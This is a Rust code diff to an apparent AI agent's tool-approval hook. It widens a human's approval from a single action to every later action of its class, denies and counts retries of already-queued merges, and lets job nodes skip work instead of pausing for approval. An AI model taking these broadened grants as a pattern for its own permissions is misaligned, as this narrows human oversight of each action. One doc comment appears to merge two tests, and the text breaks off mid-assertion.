@@ -203,15 +203,27 @@ pub async fn pretooluse_decision(
         );
     }
 
-    // Single-use authorization (spec §8.4 step 6): a resume run's FIRST high-risk action that
-    // matches the approved tool AND the approved input is allowed exactly once, overriding the
+    // Class-scoped authorization (spec §8.4 step 6): once a human has approved an action, every
+    // later action of that CLASS is allowed for the rest of the resume run, overriding the
     // pending_approval. Only a pending_approval is ever lifted — a `deny` (destructive) never
     // reaches this check, so a grant can never launder a denied action.
     //
-    // The input is part of the match, not decoration: `tool_name` is "Bash" for every shell action,
-    // so without it an approved `git push` authorized whatever this run tried next.
+    // The class is the key because neither of the alternatives is a boundary a human would
+    // recognise: `tool_name` is "Bash" for every shell action, so an approved `git push` authorized
+    // whatever this run tried next, while the exact input put the identical question a second time
+    // for the next push. The class is what the human actually agreed to.
     if classification.decision.decision == "pending_approval" && is_in_flight {
-        match crate::proposals::consume_matching_grant(
+        // Already taken over by the queue (migration 0054). Answered BEFORE the grant lookup and
+        // before the pause below, because both would be wrong here: there is no grant to consume —
+        // the approval deliberately minted none — and pausing would fetch a person to approve a
+        // merge that is already queued, whose approval would queue it a second time.
+        //
+        // A `deny` rather than a pause, because the run is being told where its work went, not asked
+        // to wait. Counted against the ordinary prober allowance, and that is deliberate: a run told
+        // in its resume prompt and again in this reason that the merge is queued and must not be
+        // retried, which does it three times regardless, is not obeying. One that reads either
+        // message spends none of it.
+        match crate::proposals::matching_queued_request(
             &state.pool,
             payload.run_id,
             &payload.tool_name,
@@ -219,11 +231,47 @@ pub async fn pretooluse_decision(
         )
         .await
         {
+            Ok(Some(request_id)) => {
+                tracing::info!(
+                    run_id = payload.run_id,
+                    request_id,
+                    "pretooluse-decision: the action is already queued — refusing the retry"
+                );
+                count_denial_and_stop_a_prober(&state, payload.run_id, &payload.tool_name).await;
+                return Json(Decision {
+                    decision: "deny".to_owned(),
+                    reason: format!(
+                        "this action was handed to the daemon's git queue as request {request_id} \
+                         when it was approved, and will be carried out there — do not attempt it \
+                         again"
+                    ),
+                });
+            }
+            Ok(None) => {}
+            // Falling through to the grant lookup is the safe direction: the worst that follows is
+            // a pause and a question for a person, which is what happened before any of this.
+            Err(error) => {
+                tracing::warn!(
+                    run_id = payload.run_id,
+                    %error,
+                    "pretooluse-decision: could not tell whether this action is already queued"
+                );
+            }
+        }
+
+        match crate::proposals::grant_covers_class(
+            &state.pool,
+            payload.run_id,
+            classification.action_class,
+        )
+        .await
+        {
             Ok(true) => {
                 tracing::info!(
                     run_id = payload.run_id,
                     tool = %payload.tool_name,
-                    "pretooluse-decision: single-use grant consumed — authorizing the approved action"
+                    action_class = classification.action_class,
+                    "pretooluse-decision: a grant covers this action class — authorizing the action"
                 );
                 let _ = crate::feed::append(
                     &state.pool,
@@ -238,7 +286,10 @@ pub async fn pretooluse_decision(
                 .await;
                 return Json(Decision {
                     decision: "allow".to_owned(),
-                    reason: "single-use authorization for an approved action".to_owned(),
+                    reason: format!(
+                        "approved authorization for the {} action class",
+                        classification.action_class
+                    ),
                 });
             }
             Ok(false) => {}
@@ -448,7 +499,7 @@ const DENIAL_LIMIT: i64 = 3;
 /// Terminated to `failed` rather than `awaiting_approval`: a denied action is destructive by
 /// classification, and the pause path exists to make an action approvable. Offering a human an
 /// "approve" button here would launder precisely the verdict that is supposed to be final — the
-/// single-use grant deliberately only ever lifts a `pending_approval`.
+/// class-scoped grant deliberately only ever lifts a `pending_approval`.
 async fn count_denial_and_stop_a_prober(state: &AppState, run_id: i64, tool_name: &str) {
     let denials: i64 = match sqlx::query_scalar(
         "UPDATE runs SET denials = denials + 1 WHERE id = ? RETURNING denials",
@@ -502,10 +553,10 @@ async fn count_denial_and_stop_a_prober(state: &AppState, run_id: i64, tool_name
 
 /// The whole `pending_approval` act: terminate the run, then record the proposal that makes the
 /// pause actionable. These two belong together — a run parked in `awaiting_approval` with no
-/// proposal can be neither approved nor rejected, and `one_open_worktree_run_per_project`
-/// (migration 0009) makes it block every later worktree run for that project, permanently: startup
-/// recovery only reconciles rows left `running`. Hence the caller runs this as a detachable task
-/// rather than inline in a request that may not survive its own side effects.
+/// proposal can be neither approved nor rejected, and it goes on holding one of the project's
+/// concurrency slots, permanently: the sweep spares `awaiting_approval`, and startup recovery only
+/// reconciles rows left `running`. Hence the caller runs this as a detachable task rather than
+/// inline in a request that may not survive its own side effects.
 async fn pause_for_approval(
     state: AppState,
     run_id: i64,
@@ -519,15 +570,72 @@ async fn pause_for_approval(
         return;
     }
 
-    let (session_id, project_id) = sqlx::query_as::<_, (Option<String>, Option<String>)>(
-        "SELECT session_id, project_id FROM runs WHERE id = ?",
-    )
-    .bind(run_id)
-    .fetch_optional(&state.pool)
-    .await
-    .ok()
-    .flatten()
-    .unwrap_or((None, None));
+    let (session_id, project_id, job_id, stage) =
+        sqlx::query_as::<_, (Option<String>, Option<String>, Option<i64>, Option<String>)>(
+            "SELECT session_id, project_id, job_id, stage FROM runs WHERE id = ?",
+        )
+        .bind(run_id)
+        .fetch_optional(&state.pool)
+        .await
+        .ok()
+        .flatten()
+        .unwrap_or((None, None, None, None));
+
+    // A node of a job takes the other road entirely, and three shapes of node take three roads.
+    //
+    // An **item's** node is put down and the job carries on to the next item. A **review** node owns
+    // no item and does not need one: its verdict is advisory — §5.5 gives ship/no-ship to the gate —
+    // and everything it was going to read is already written, gated and checkpointed. A **replan**
+    // node owns none either, and ending it hands the job to `stop_after_replan`, which stops it
+    // `Stopped` rather than `Failed` precisely so the rounds that DID run stay worth looking at.
+    //
+    // The rule underneath all three: **a node that asks already has an ending written for it**, and
+    // the job's own handler picks it. What parking adds is not safety — it is a job that reads live,
+    // holds a concurrency slot and does nothing, with no sign anywhere until a person goes looking.
+    //
+    // Measured, not reasoned into. Chunk 2 put review and plan on one road with a single sentence,
+    // and four jobs falsified it in a day: 12 parked its review on `git reflog`, 13 parked its own
+    // on a `for` loop, and 14 and 16 both parked their REPLAN nodes after every item had passed.
+    //
+    // The **plan** node is the one that still parks, and the argument for it is the one Chunk 2
+    // made: the queue is what it produces, so there is nothing partial to preserve and nothing to
+    // carry on to. Ending it would fail a job that a single answer turns into a night's work, to
+    // save a slot that is now bounded by a ceiling rather than blocking the project.
+    //
+    // The mark is what decides for an item, and it is also step (2) of the skip — see
+    // `skip_the_item`. Doing it here rather than inside keeps "did this run own an item?" and "put
+    // it down" as one write: asking first and marking after would be a race with the same
+    // cancel/reconcile the mark is already guarded against.
+    //
+    // Read HERE and not before the termination above, deliberately: `job_id` does not change when a
+    // run ends, and moving the read earlier would put an extra query on the hot path of every
+    // ordinary run's hook, which is nearly all of them.
+    let road = match job_id {
+        Some(job_id) if put_the_item_down(&state.pool, job_id, run_id).await => {
+            Some((job_id, true))
+        }
+        Some(job_id) if NODES_THAT_GIVE_UP.contains(&stage.as_deref().unwrap_or_default()) => {
+            Some((job_id, false))
+        }
+        _ => None,
+    };
+    if let Some((job_id, had_an_item)) = road {
+        skip_the_item(
+            state,
+            SkippedItem {
+                run_id,
+                job_id,
+                session_id,
+                project_id,
+                tool_name,
+                tool_input,
+                reason,
+                had_an_item,
+            },
+        )
+        .await;
+        return;
+    }
 
     if let Err(error) = crate::proposals::create_action_approval(
         &state.pool,
@@ -555,9 +663,10 @@ async fn pause_for_approval(
         .await;
 
         // Warning alone left the run parked in `awaiting_approval` with nothing to approve or
-        // reject, and `one_open_worktree_run_per_project` (migration 0009) turns that into a block
-        // on every later worktree run for the project. `reconcile_stranded_approvals` clears it —
-        // but only at startup, so the project stayed jammed until someone restarted the daemon.
+        // reject, holding one of the project's concurrency slots for good: the sweep spares that
+        // status on purpose, because a run with a PENDING proposal is resumable.
+        // `reconcile_stranded_approvals` is what tells the two apart — but only at startup, so the
+        // project ran one slot narrower until someone restarted the daemon.
         //
         // Undo the pause instead. `interrupted` is the status startup recovery already uses for
         // exactly this shape, so a run that ends here reads the same either way, and the slot is
@@ -583,6 +692,216 @@ async fn pause_for_approval(
                 "pretooluse-decision: could not roll back an unapprovable pause — this project is blocked until restart"
             ),
         }
+    }
+}
+
+/// A job's node asked for a decision, so the job puts the item down and carries on without it.
+///
+/// The other half of `pause_for_approval`, and it exists because parking is the wrong answer for a
+/// job. A run belongs to a person who is going to come back to it; a job is the thing that was
+/// supposed to work while nobody was watching, and stopping it dead on the first unrecognised shell
+/// command is what "work through the night" met in practice — measured on 2026-08-07, where a
+/// two-item job in a four-file repository parked seven times.
+///
+/// **The order of the three writes below is the whole safety argument, and it is not arbitrary.**
+///
+/// 1. The run is already terminated by the caller. That `.await` is the one `core/AGENTS.md` names
+///    as biting hardest: it kills the CLI whose hook script owns the connection being answered, so
+///    everything after it runs on borrowed time.
+/// 2. **Mark the item.** First, and before anything that can fail or block — done by the caller in
+///    `put_the_item_down`, because whether the mark landed is also what decides that this road is
+///    the right one at all. An item left `running` in a job nobody is driving is a job that answers
+///    `Wait` for ever — `next_step` sees a live node, there is no live node, and no later pass
+///    rescues it. Every other loss here is recoverable; that one is not.
+/// 3. **Take the pause off the run.** The caller parked it to ask; the asking is over. A run left
+///    `awaiting_approval` parks the whole job through `job::node_awaiting_approval`, which is the
+///    same stop by another door — the item reads `skipped` and the job waits on it anyway.
+///    Recoverable, unlike (2): `reconcile_stranded_approvals` writes the same `interrupted` at the
+///    next startup, which is why it goes second and not first.
+/// 4. Revert the tree, then record the proposal. Both may fail, and neither failure is allowed to
+///    take the mark with it: an item skipped without a proposal is work nobody will be reminded of,
+///    which is bad and survivable, where an item stuck `running` is a dead job.
+struct SkippedItem {
+    run_id: i64,
+    job_id: i64,
+    session_id: Option<String>,
+    project_id: Option<String>,
+    tool_name: String,
+    tool_input: String,
+    reason: String,
+    /// Whether this run owned an item whose half-written edits have to be undone.
+    ///
+    /// False for a review node, the other thing that takes this road, and the difference is not
+    /// cosmetic. A review node owns no item, so `footing_for_run` would answer for whichever item
+    /// ran last — and reverting to that footing would throw away the checkpoint of the job's final
+    /// item, which is the one thing the review existed to look at. A node that changes nothing by
+    /// design has nothing to revert.
+    had_an_item: bool,
+}
+
+/// The job stages that give their node up rather than parking the job on it.
+///
+/// Both own no item, and both already have an ending written for the case where their run does not
+/// come back: `ingest_replan`'s failure arm hands the job to `stop_after_replan` (`Stopped`, with
+/// the rounds that ran still on the branch), and `load_view` reads any terminal review as `Done`
+/// ("a review that failed is still a review that happened").
+///
+/// `plan` is deliberately absent. Its ending exists too — `Outcome::Failed` — but it is the only one
+/// that throws away a whole job to save a slot: nothing has been done yet, so there is no partial
+/// work to preserve, and a single answer turns that same job into a night's work.
+const NODES_THAT_GIVE_UP: [&str; 2] = ["review", "replan"];
+
+/// Step (2) of the skip, and the question that decides whether there is a skip at all: mark this
+/// run's item `skipped`, and say whether there was one.
+///
+/// Scoped to the item this run owns, so a job whose other items are in flight is untouched. A
+/// `false` answer has two shapes and the caller treats them alike, because the right move is the
+/// same for both — park and ask:
+///
+/// - **No item exists.** A plan or review node. There is nothing to put down, and skipping a job's
+///   plan would leave it with no queue to carry on with.
+/// - **The item is no longer `running`.** A cancel or a reconcile got there first and its verdict is
+///   the newer one; overwriting it would be this handler talking over a decision already made.
+///
+/// A database error also answers `false`, which parks the run rather than skipping an item that may
+/// still be `running`. Loud, and recoverable by hand — where a job stalled on a live item is not.
+async fn put_the_item_down(pool: &sqlx::SqlitePool, job_id: i64, run_id: i64) -> bool {
+    let marked = sqlx::query(
+        "UPDATE job_items SET status = ? WHERE job_id = ? AND run_id = ? AND status = 'running'",
+    )
+    .bind(crate::job::STATUS_SKIPPED)
+    .bind(job_id)
+    .bind(run_id)
+    .execute(pool)
+    .await;
+    match marked {
+        Ok(result) if result.rows_affected() == 1 => true,
+        Ok(_) => {
+            tracing::info!(
+                run_id,
+                job_id,
+                "pretooluse-decision: no running job item for this run — parking it instead"
+            );
+            false
+        }
+        Err(error) => {
+            tracing::error!(
+                run_id,
+                job_id,
+                %error,
+                "pretooluse-decision: could not mark a job item skipped — parking the run instead"
+            );
+            false
+        }
+    }
+}
+
+async fn skip_the_item(state: AppState, item: SkippedItem) {
+    let SkippedItem {
+        run_id,
+        job_id,
+        session_id,
+        project_id,
+        tool_name,
+        tool_input,
+        reason,
+        had_an_item,
+    } = item;
+
+    // (3) Take the pause off the RUN. The caller terminated it to `awaiting_approval`, because at
+    // that point the answer was still "ask a person". It is not any more — the answer was "skip it",
+    // and it has already been given.
+    //
+    // Without this the job stops anyway, one step later and for a different reason:
+    // `job::node_awaiting_approval` asks whether ANY run of the job is `awaiting_approval` and parks
+    // the whole job when one is, and `node_in_flight` counts that status as a node still to wait
+    // for. The item would read `skipped` while the job sat on a node nobody would ever answer —
+    // measured on 2026-08-08, job 3: item 0 `skipped`, job `awaiting_approval`, nothing pending.
+    //
+    // `interrupted` and not something new: it is what `reconcile_stranded_approvals` writes at
+    // startup for precisely this row (an `awaiting_approval` run with no `action-approval` proposal),
+    // and what `pause_for_approval` rolls back to when a pause turns out not to be one. Writing it
+    // here is the same verdict without waiting for a restart.
+    //
+    // AFTER the item's mark, never before, for two reasons. If this write is lost the damage is
+    // recoverable — that same startup reconciler writes it — where an item left `running` is a job
+    // that answers `Wait` for ever and no pass rescues. And the window between the two writes is
+    // only safe in this order: `job::reconcile_nodes` folds back every item that is still `running`
+    // whose run has left flight, and would read this one as `failed` and stop the chain. Marked
+    // first, the item is no longer `running` and that query cannot see it at all.
+    //
+    // Guarded on the status the caller set, so a cancel that landed in between keeps the last word.
+    let unpaused = sqlx::query(
+        "UPDATE runs SET status = 'interrupted', completed_at = ?
+         WHERE id = ? AND status = 'awaiting_approval'",
+    )
+    .bind(chrono::Utc::now().to_rfc3339())
+    .bind(run_id)
+    .execute(&state.pool)
+    .await;
+    if let Err(error) = unpaused {
+        tracing::error!(
+            run_id,
+            job_id,
+            %error,
+            "pretooluse-decision: could not lift the pause off a skipped item's run — the job will park until restart"
+        );
+    }
+
+    // (4a) Put the tree back. The item wrote whatever it wrote before it asked, and the next item
+    // must not build on a half-done change nobody approved.
+    //
+    // Only for an item. A review node reaches this function too and must NOT come through here:
+    // it owns no item, so `footing_for_run` would answer for whichever one ran last, and reverting
+    // to that footing would discard the checkpoint of the job's final item — the very work the
+    // review was there to read. A node that changes nothing by design has nothing to put back.
+    if had_an_item {
+        let footing = crate::job::footing_for_run(&state.pool, job_id, run_id).await;
+        match (
+            crate::job::job_worktree_path(&state.pool, job_id).await,
+            footing,
+        ) {
+            (Some(worktree), Some(sha)) => {
+                if let Err(error) = crate::worktree::revert_to(&worktree, &sha).await {
+                    tracing::warn!(run_id, job_id, %error, "pretooluse-decision: could not revert a skipped item");
+                }
+            }
+            _ => tracing::warn!(
+                run_id,
+                job_id,
+                "pretooluse-decision: no worktree or no footing to revert a skipped item to"
+            ),
+        }
+    }
+
+    // (4b) The proposal. A different `kind` from an action approval, and `wip.rs` counts only the
+    // other one: this is work NOT YET DONE waiting on a decision, where the WIP limit exists to cap
+    // work already done waiting to be looked at. Conflating them closes the autonomy this change
+    // just opened, at the third skipped item of the night.
+    if let Err(error) = crate::proposals::create_skipped_item(
+        &state.pool,
+        run_id,
+        session_id.as_deref(),
+        project_id.as_deref(),
+        &tool_name,
+        &reason,
+        Some(&tool_input),
+    )
+    .await
+    {
+        tracing::warn!(run_id, job_id, %error, "pretooluse-decision: failed to record a skipped-item proposal");
+        let _ = crate::feed::append(
+            &state.pool,
+            project_id.as_deref(),
+            "proposal_record_failed",
+            &format!("failed to record skipped-item proposal: {error}"),
+            Some(run_id),
+        )
+        .await;
+        // Deliberately NOT rolled back, where the action-approval path above rolls its pause back.
+        // There the run is stuck `awaiting_approval` with nothing to approve, holding an index that
+        // blocks the project. Here the item is `skipped`, the job moves on, and what is lost is the
+        // reminder — a worse outcome than having it, and a far better one than a job that stalls.
     }
 }
 
@@ -703,6 +1022,60 @@ mod tests {
         run_id
     }
 
+    /// A live implement node of a live job: the job row, one `running` item, the run that owns it,
+    /// and a worktree row for the job so the revert has somewhere to point.
+    ///
+    /// Returns `(job_id, run_id)`.
+    async fn in_flight_job_node(state: &AppState) -> (i64, i64) {
+        let job_id = sqlx::query(
+            "INSERT INTO jobs
+             (project_id, project_root, prompt, status, max_items, gate_each, review, created_at)
+             VALUES ('proj', 'C:\\work\\repo', 'advance the backlog', 'implementing', 5, 1, 1,
+                     '2026-08-07T00:00:00Z')",
+        )
+        .execute(&state.pool)
+        .await
+        .unwrap()
+        .last_insert_rowid();
+
+        let run_id = in_flight_run(
+            state,
+            "worktree",
+            Some("proj"),
+            Some("C:\\work\\repo"),
+            Some("sess-x"),
+        )
+        .await;
+        sqlx::query("UPDATE runs SET job_id = ?, stage = 'implement' WHERE id = ?")
+            .bind(job_id)
+            .bind(run_id)
+            .execute(&state.pool)
+            .await
+            .unwrap();
+
+        sqlx::query(
+            "INSERT INTO job_items (job_id, ordinal, description, status, run_id)
+             VALUES (?, 0, 'the first thing', 'running', ?)",
+        )
+        .bind(job_id)
+        .bind(run_id)
+        .execute(&state.pool)
+        .await
+        .unwrap();
+
+        sqlx::query(
+            "INSERT INTO worktrees (owner_kind, owner_id, project_id, project_root, path, branch, created_at)
+             VALUES ('job', ?, 'proj', 'C:\\work\\repo', 'C:\\work\\wt', 'nucleos/job-x',
+                     '2026-08-07T00:00:00Z')",
+        )
+        .bind(job_id)
+        .execute(&state.pool)
+        .await
+        .unwrap();
+
+        (job_id, run_id)
+    }
+
     /// A `runs` row without an abort handle: the run exists and its mode is on record, but nothing
     /// is executing under it. Every barrier that reads `mode` has to hold here too, because this is
     /// the state a run passes through on its way out — and the state a forged request would claim.
@@ -799,6 +1172,90 @@ mod tests {
         assert!(
             proposals.is_empty(),
             "stopping a prober must not mint something a human can approve"
+        );
+    }
+
+    /// A run that tries again the action the queue took over is TOLD so, not paused.
+    ///
+    /// The loop this closes: the approval queues the merge and mints no grant, so the resumed run's
+    /// retry used to be an ordinary `pending_approval` — pausing the run and putting a second
+    /// proposal in front of a person, whose approval would queue the same merge a second time. The
+    /// prompt asks the run not to retry; this is what happens when it does anyway.
+    ///
+    /// Three things are asserted because getting any one of them wrong reopens the loop: the verdict
+    /// names the request, the run is still in flight, and nothing was minted for a person to read.
+    #[tokio::test]
+    async fn an_action_the_queue_already_has_is_refused_rather_than_asked_about_again() {
+        let state = test_state().await;
+        let run_id = in_flight_run(&state, "worktree", Some("proj-1"), None, None).await;
+        let app = test_router(state.clone());
+        let input = r#"{"command":"git merge feature/x"}"#;
+
+        sqlx::query(
+            "INSERT INTO action_grants
+             (run_id, tool_name, tool_input, proposal_id, created_at, consumed_at, queued_request_id)
+             VALUES (?, 'Bash', ?, 1, '2026-01-01T00:00:00Z', NULL, 77)",
+        )
+        .bind(run_id)
+        .bind(input)
+        .execute(&state.pool)
+        .await
+        .unwrap();
+
+        let body = format!(r#"{{"run_id":{run_id},"tool_name":"Bash","tool_input":{input}}}"#);
+        let decision = decide(&app, &body).await;
+
+        assert_eq!(decision.decision, "deny");
+        assert!(
+            decision.reason.contains("request 77"),
+            "the run has to be told WHICH request has its work: {}",
+            decision.reason
+        );
+        assert!(
+            state.run_handles.lock().unwrap().contains_key(&run_id),
+            "a refusal that names the queue must not also stop the run"
+        );
+        assert!(
+            proposals::list_pending(&state.pool)
+                .await
+                .unwrap()
+                .is_empty(),
+            "asking a person again about a merge already queued would queue it twice"
+        );
+    }
+
+    /// The refusal is COUNTED, and that is the half that keeps the answer from being free.
+    ///
+    /// Without it the verdict would be the one thing in the system that neither pauses the run nor
+    /// spends anything: a run that ignores both the resume prompt and the reason string could retry
+    /// for ever, burning tokens against a merge that is already on its way. The test that asserts
+    /// the run survives ONE refusal cannot see that — it passes whether or not anything is counted.
+    #[tokio::test]
+    async fn a_run_that_keeps_retrying_a_queued_action_is_stopped() {
+        let state = test_state().await;
+        let run_id = in_flight_run(&state, "worktree", Some("proj-1"), None, None).await;
+        let app = test_router(state.clone());
+        let input = r#"{"command":"git merge feature/x"}"#;
+
+        sqlx::query(
+            "INSERT INTO action_grants
+             (run_id, tool_name, tool_input, proposal_id, created_at, consumed_at, queued_request_id)
+             VALUES (?, 'Bash', ?, 1, '2026-01-01T00:00:00Z', NULL, 77)",
+        )
+        .bind(run_id)
+        .bind(input)
+        .execute(&state.pool)
+        .await
+        .unwrap();
+
+        let body = format!(r#"{{"run_id":{run_id},"tool_name":"Bash","tool_input":{input}}}"#);
+        for _ in 0..DENIAL_LIMIT {
+            assert_eq!(decide(&app, &body).await.decision, "deny");
+        }
+
+        assert!(
+            !state.run_handles.lock().unwrap().contains_key(&run_id),
+            "a run told {DENIAL_LIMIT} times where its work went, that asks again, is not obeying"
         );
     }
 
@@ -998,16 +1455,19 @@ mod tests {
         assert_eq!(decision.reason, "recognized non-mutating shell command");
     }
 
+    /// The hook's pending path, and the classifier's verdict that reaches it, asserted together so
+    /// the two cannot drift apart. `echo hi` stood here until `classifier.rs` learned that saying
+    /// something is not doing something; the command changed, the path under test did not.
     #[tokio::test]
     async fn pends_unrecognized_command() {
-        let tool_input = serde_json::json!({"command": "echo hi"});
+        let tool_input = serde_json::json!({"command": "frobnicate --hard"});
         let classification = classifier::classify("Bash", &tool_input, None);
         assert_eq!(classification.action_class, "unrecognized");
 
         let app = test_router(test_state().await);
         let decision = decide(
             &app,
-            r#"{"run_id":0,"tool_name":"Bash","tool_input":{"command":"echo hi"}}"#,
+            r#"{"run_id":0,"tool_name":"Bash","tool_input":{"command":"frobnicate --hard"}}"#,
         )
         .await;
         assert_eq!(decision.decision, "pending_approval");
@@ -1123,9 +1583,10 @@ mod tests {
     /// way `abort()` does — so everything sequenced after the termination is lost.
     ///
     /// The loss is unrecoverable, not merely untidy: a run parked in `awaiting_approval` with no
-    /// proposal can be neither approved nor rejected, and `one_open_worktree_run_per_project`
-    /// (migration 0009) then makes it block every later worktree run for that project. Startup
-    /// recovery does not help — it only reconciles rows left `running`.
+    /// proposal can be neither approved nor rejected, and it holds one of the project's concurrency
+    /// slots for as long as it sits there — the sweep spares that status, because a run with a
+    /// pending proposal is resumable. Startup recovery does not help either: it only reconciles rows
+    /// left `running`.
     #[tokio::test]
     async fn a_dropped_hook_request_still_records_the_approval_proposal() {
         use std::future::Future;
@@ -1431,6 +1892,361 @@ mod tests {
         assert_eq!(proposal.project_id.as_deref(), Some("proj"));
         assert_eq!(proposal.status, "pending");
         assert!(!proposal.reasoning.is_empty());
+    }
+
+    /// A job's node takes the other road out of the same door.
+    ///
+    /// The item is put down, the job is left alone to carry on, and the record is a `skipped-item`
+    /// rather than an `action-approval` — which is what stops `list_pending` offering it as
+    /// something to approve, since approving it would resume nothing.
+    #[tokio::test]
+    async fn a_jobs_node_skips_its_item_instead_of_parking_the_job() {
+        let state = test_state().await;
+        let (job_id, run_id) = in_flight_job_node(&state).await;
+        let app = test_router(state.clone());
+
+        let decision = decide(
+            &app,
+            &serde_json::json!({
+                "run_id": run_id,
+                "tool_name": "Bash",
+                "tool_input": {"command": "git push origin main"}
+            })
+            .to_string(),
+        )
+        .await;
+        assert_eq!(decision.decision, "pending_approval");
+
+        let item: (String, i64) =
+            sqlx::query_as("SELECT status, ordinal FROM job_items WHERE job_id = ? AND run_id = ?")
+                .bind(job_id)
+                .bind(run_id)
+                .fetch_one(&state.pool)
+                .await
+                .unwrap();
+        assert_eq!(item.0, "skipped", "the item must not be left running");
+
+        let job_status: String = sqlx::query_scalar("SELECT status FROM jobs WHERE id = ?")
+            .bind(job_id)
+            .fetch_one(&state.pool)
+            .await
+            .unwrap();
+        assert_eq!(
+            job_status, "implementing",
+            "the job itself is untouched — it has a queue to get on with"
+        );
+
+        let kinds: Vec<String> = sqlx::query_scalar("SELECT kind FROM proposals")
+            .fetch_all(&state.pool)
+            .await
+            .unwrap();
+        assert_eq!(kinds, vec!["skipped-item"]);
+        assert!(
+            proposals::list_pending(&state.pool)
+                .await
+                .unwrap()
+                .is_empty(),
+            "a skipped item is a note, not something to approve — approving it resumes nothing"
+        );
+
+        // And the half the first version of this test did not ask about, which is what let the
+        // whole thing stop anyway. `job::node_awaiting_approval` parks a job when ANY of its runs
+        // is `awaiting_approval`, so a skipped item whose run keeps that status trades one stop for
+        // another: the item reads `skipped` and the job waits on it for ever.
+        let run_status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
+            .bind(run_id)
+            .fetch_one(&state.pool)
+            .await
+            .unwrap();
+        assert_eq!(
+            run_status, "interrupted",
+            "the run must not keep asking after the answer was given"
+        );
+        let still_parked: Option<i64> = sqlx::query_scalar(
+            "SELECT id FROM runs WHERE job_id = ? AND status = 'awaiting_approval' LIMIT 1",
+        )
+        .bind(job_id)
+        .fetch_optional(&state.pool)
+        .await
+        .unwrap();
+        assert!(
+            still_parked.is_none(),
+            "this is the query `job::node_awaiting_approval` runs; a hit here parks the whole job"
+        );
+    }
+
+    /// And the counterpart, which is the one that would go wrong quietly: a run with no `job_id`
+    /// keeps the behaviour it has always had. This is the test that fails if the branch above is
+    /// ever widened past the condition it was written for.
+    #[tokio::test]
+    async fn a_run_that_belongs_to_no_job_still_parks_and_asks() {
+        let state = test_state().await;
+        let run_id = in_flight_run(
+            &state,
+            "worktree",
+            Some("proj"),
+            Some("C:\\work\\repo"),
+            Some("sess-x"),
+        )
+        .await;
+        let app = test_router(state.clone());
+
+        decide(
+            &app,
+            &serde_json::json!({
+                "run_id": run_id,
+                "tool_name": "Bash",
+                "tool_input": {"command": "git push origin main"}
+            })
+            .to_string(),
+        )
+        .await;
+
+        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
+            .bind(run_id)
+            .fetch_one(&state.pool)
+            .await
+            .unwrap();
+        assert_eq!(status, "awaiting_approval");
+        let kinds: Vec<String> = sqlx::query_scalar("SELECT kind FROM proposals")
+            .fetch_all(&state.pool)
+            .await
+            .unwrap();
+        assert_eq!(kinds, vec!["action-approval"]);
+    }
+
+    /// The node of a job that owns no item: the plan, which runs before the queue exists.
+    ///
+    /// Found by dogfooding the change above on 2026-08-07 — the plan node asked to run `find`, took
+    /// the job road because its run has a `job_id`, matched no item, and returned before writing any
+    /// proposal. The run sat in `awaiting_approval` with nothing to approve, which is precisely the
+    /// state `pause_for_approval`'s rollback exists to prevent, and which holds one of the
+    /// project's concurrency slots until a restart notices.
+    ///
+    /// The queue is what the plan produces, so there is nothing to skip and nothing to carry on to.
+    /// It parks and asks, like any other run — and it is the ONLY node that still does. A review
+    /// node owns no item either and stopped taking this road; see the test below for why.
+    #[tokio::test]
+    async fn a_jobs_plan_node_owns_no_item_so_it_parks_and_asks() {
+        let state = test_state().await;
+        let (job_id, run_id) = in_flight_job_node(&state).await;
+        // What makes it a plan node: the queue does not exist yet.
+        sqlx::query("DELETE FROM job_items WHERE job_id = ?")
+            .bind(job_id)
+            .execute(&state.pool)
+            .await
+            .unwrap();
+        sqlx::query("UPDATE runs SET stage = 'plan' WHERE id = ?")
+            .bind(run_id)
+            .execute(&state.pool)
+            .await
+            .unwrap();
+        let app = test_router(state.clone());
+
+        decide(
+            &app,
+            &serde_json::json!({
+                "run_id": run_id,
+                "tool_name": "Bash",
+                "tool_input": {"command": "git push origin main"}
+            })
+            .to_string(),
+        )
+        .await;
+
+        let pending = proposals::list_pending(&state.pool).await.unwrap();
+        assert_eq!(
+            pending.len(),
+            1,
+            "a parked node with no proposal can be neither approved nor rejected, and blocks the \
+             project until the daemon restarts"
+        );
+        assert_eq!(pending[0].kind, "action-approval");
+        assert_eq!(pending[0].run_id, Some(run_id));
+    }
+
+    /// A review node abandons the review rather than parking the job on it.
+    ///
+    /// It owns no item, so it used to take the plan node's road and park — and the cost of that is
+    /// the whole night, not one opinion. Its verdict is advisory (§5.5 gives ship/no-ship to the
+    /// gate), it runs after every item is written, gated and checkpointed, and it changes nothing
+    /// itself. So the job loses a review and finishes, which is the trade the right way round.
+    ///
+    /// Measured twice before it was changed: job 12 on 2026-08-08 parked its review node on
+    /// `git reflog` and job 13 parked its own on a `for` loop, each with all the real work already
+    /// done. Both sat until a person cancelled them.
+    ///
+    /// The run must end TERMINAL, and that is the whole mechanism — `load_view` already reads any
+    /// finished review as `ReviewState::Done` ("a review that failed is still a review that
+    /// happened"), so the round closes with no change to the state machine at all.
+    /// The replan node too, and for the same reason with a different ending behind it.
+    ///
+    /// Its run ending non-successfully hands the job to `stop_after_replan`, which stops it
+    /// `Stopped` and not `Failed` — precisely so the rounds that already ran stay worth looking at.
+    /// That ending existed before this; all that was missing is the node reaching it.
+    ///
+    /// Measured on 2026-08-08: jobs 14 and 16 both passed every item, closed their round, spawned
+    /// their replan node — and both parked it, one on a `for` loop and one on `find`. Two jobs that
+    /// had done all their work sat holding a slot each.
+    #[tokio::test]
+    async fn a_jobs_replan_node_gives_up_instead_of_parking_the_job() {
+        let state = test_state().await;
+        let (job_id, run_id) = in_flight_job_node(&state).await;
+        sqlx::query("UPDATE job_items SET status = 'passed', run_id = NULL WHERE job_id = ?")
+            .bind(job_id)
+            .execute(&state.pool)
+            .await
+            .unwrap();
+        sqlx::query("UPDATE runs SET stage = 'replan' WHERE id = ?")
+            .bind(run_id)
+            .execute(&state.pool)
+            .await
+            .unwrap();
+        let app = test_router(state.clone());
+
+        decide(
+            &app,
+            &serde_json::json!({
+                "run_id": run_id,
+                "tool_name": "Bash",
+                // A shell loop, which the classifier reads as a program rather than a line and so
+                // does not recognise. NOT `find`, which it allows — an allowed command never
+                // reaches this road, and the run would read terminal for the wrong reason.
+                "tool_input": {"command": "for f in *.py; do cat \"$f\"; done"}
+            })
+            .to_string(),
+        )
+        .await;
+
+        let status: String = sqlx::query_scalar("SELECT status FROM runs WHERE id = ?")
+            .bind(run_id)
+            .fetch_one(&state.pool)
+            .await
+            .unwrap();
+        assert_ne!(
